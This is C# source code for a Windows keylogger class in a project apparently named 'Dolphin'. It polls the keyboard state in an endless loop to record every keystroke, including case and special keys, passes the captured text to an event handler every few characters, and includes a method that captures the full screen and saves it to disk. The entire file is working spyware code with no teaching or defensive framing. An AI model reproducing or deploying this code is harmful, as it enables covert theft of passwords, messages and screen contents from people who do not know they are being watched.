using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Dolphin
{
    class KeyLogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public event Action<StringBuilder> IsFull;

        public StringBuilder LogsStream = new StringBuilder();

        public void Run()
        {
            Keys key = 0;
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        key = (Keys)i;
                        bool shift = false;
                        short shiftState = (short)GetAsyncKeyState(16);
                        if ((shiftState & 0x8000) == 0x8000)
                        {
                            shift = true;
                        }
                        var caps = Console.CapsLock;
                        bool isBig = shift | caps;
                        if (key == Keys.Space)
                        {
                            LogsStream.Append(" "); continue;
                        }

                        if (key == Keys.Enter)
                        {
                            LogsStream.Append("<Enter>"); continue;
                        }
                        if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton)
                            continue;
                        if (key.ToString().Length == 1)
                        {
                            if (isBig)
                            {
                                LogsStream.Append(key.ToString());
                            }
                            else
                            {
                                LogsStream.Append(key.ToString().ToLowerInvariant());
                            }
                        }
                        else
                        {
                            LogsStream.Append($"<{key}>");
                        }
                        if (LogsStream.Length > 5)
                        {
                            IsFull?.Invoke(LogsStream);
                            LogsStream.Clear();
                        }
                    }
                }
            }
        }

        public Bitmap Screenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using var bitmap = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            bitmap.Save("test.jpg", ImageFormat.Jpeg);
            return bitmap;
            //bitmap.Save("test.jpg", ImageFormat.Jpeg);
        }
    }
}
